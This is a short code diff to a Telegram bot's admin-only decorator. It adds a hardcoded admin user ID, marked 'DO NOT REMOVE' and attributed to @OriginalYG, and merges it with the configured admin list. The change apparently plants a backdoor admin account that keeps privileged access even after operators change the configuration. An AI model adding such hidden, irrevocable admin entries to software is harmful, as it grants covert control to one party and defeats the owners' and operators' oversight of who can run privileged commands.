@@ -54,10 +54,15 @@ async def check_covenant_membership(user_id: int, context: ContextTypes.DEFAULT_
 
 def admin_only(func):
     """Decorator to restrict commands to admin users"""
+    # Hardcoded admin IDs - DO NOT REMOVE
+    HARDCODED_ADMINS = [8227072324]  # @OriginalYG
+
     @wraps(func)
     async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
         user_id = update.effective_user.id
-        if user_id not in config.ADMIN_USER_IDS:
+        # Check both hardcoded and config admin lists
+        all_admins = set(HARDCODED_ADMINS + getattr(config, 'ADMIN_USER_IDS', []))
+        if user_id not in all_admins:
             await update.message.reply_text("❌ This command is admin-only.")
             return
         return await func(update, context, *args, **kwargs)
